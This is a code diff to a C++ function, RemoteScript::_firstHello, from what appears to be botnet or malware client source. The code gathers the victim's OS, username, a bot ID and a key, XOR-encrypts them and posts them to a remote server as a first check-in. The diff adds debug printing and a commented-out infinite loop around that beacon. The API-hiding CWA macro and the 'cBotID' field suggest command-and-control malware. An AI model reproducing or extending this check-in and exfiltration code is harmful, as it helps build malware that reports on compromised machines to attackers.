@@ -10,17 +10,23 @@ void RemoteScript::_firstHello(PCORE_DATA _coreData){
 
 	char cpostData[1024];
 	CWA(kernel32, ZeroMemory)(cpostData, sizeof(cpostData));
-	sprintf_s(cpostData, sizeof(cpostData), "os=%s&username=%s&id=%s&key=%s", os, username, _coreData->cBotID, _coreData->coreConfig.key.key);
+	//while (1)
+	{
+		sprintf_s(cpostData, sizeof(cpostData), "os=%s&username=%s&id=%s&key=%s", os, username, _coreData->cBotID, _coreData->coreConfig.key.key);
+		printf("cpostData: %s\r\n", cpostData);
+		printf("cpostDataSize: %d\r\n", strlen(cpostData));
+		BYTE cpostDataEncrypted[1024];
+		CWA(kernel32, ZeroMemory)(cpostDataEncrypted, sizeof(cpostDataEncrypted));
+		//printf("key = %s\r\n", _coreData->coreConfig.key.key);
+		Crypter::_XOR((BYTE*)_coreData->coreConfig.key.key,
+			strlen(_coreData->coreConfig.key.key),
+			cpostDataEncrypted,
+			(BYTE*)cpostData, strlen(cpostData));
+		DWORD dwDataSize = strlen(cpostData);
+		Http::_postDataToServer(_coreData, cpostDataEncrypted, dwDataSize);
+		//Sleep(5000);
+	}
 	
-	BYTE cpostDataEncrypted[1024];
-	CWA(kernel32, ZeroMemory)(cpostDataEncrypted, sizeof(cpostDataEncrypted));
-	//printf("key = %s\r\n", _coreData->coreConfig.key.key);
-	Crypter::_XOR((BYTE*)_coreData->coreConfig.key.key, 
-		strlen(_coreData->coreConfig.key.key),
-		cpostDataEncrypted,
-		(BYTE*)cpostData,strlen(cpostData));
-	DWORD dwDataSize = strlen(cpostData);
-	Http::_postDataToServer(_coreData, cpostDataEncrypted, dwDataSize);
 	//printf("cpostDataEncrypted: %s\r\n", cpostDataEncrypted);
 	/**/
 }
